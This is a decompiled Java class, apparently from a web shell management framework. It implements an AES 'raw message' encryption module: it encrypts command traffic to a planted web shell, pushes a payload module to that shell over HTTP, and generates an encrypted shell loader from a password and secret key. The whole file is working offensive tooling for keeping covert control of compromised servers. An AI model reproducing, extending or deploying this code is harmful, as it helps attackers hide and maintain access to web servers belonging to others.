/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.JavaAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import shells.cryptions.JavaAes.Generate;
import util.Log;
import util.functions;
import util.http.Http;

//@CryptionAnnotation(Name="JAVA_AES_RAW_MESSAGE", payloadName="JavaDynamicPayload")
public class JavaAesRawmessage
implements Cryption {
    private ShellEntity shell;
    private Http http;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String findStrLeft;
    private String pass;
    private String findStrRight;

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        String findStrMd5 = functions.md5(this.pass + this.key);
        //this.findStrLeft = findStrMd5.substring(0).toUpperCase();
        //this.findStrRight = findStrMd5.substring(0).toUpperCase();
//        this.findStrLeft = "{\"message\":\"";
//        this.findStrRight = "\"}";
        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.payload = this.shell.getPayloadModule().getPayload();
            this.shell.getHeaders().put("Content-Type", "application/octet-stream");
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
            return;
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            return this.encodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        try {
            return this.decodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }


//    public String findStr(byte[] respResult) {
//        String htmlString = new String(respResult);
//        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
//    }
    @Override
    public boolean isSendRLData() {
        return true;
    }


    @Override
    public boolean check() {
        return this.state;
    }

    @Override
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
    }
}

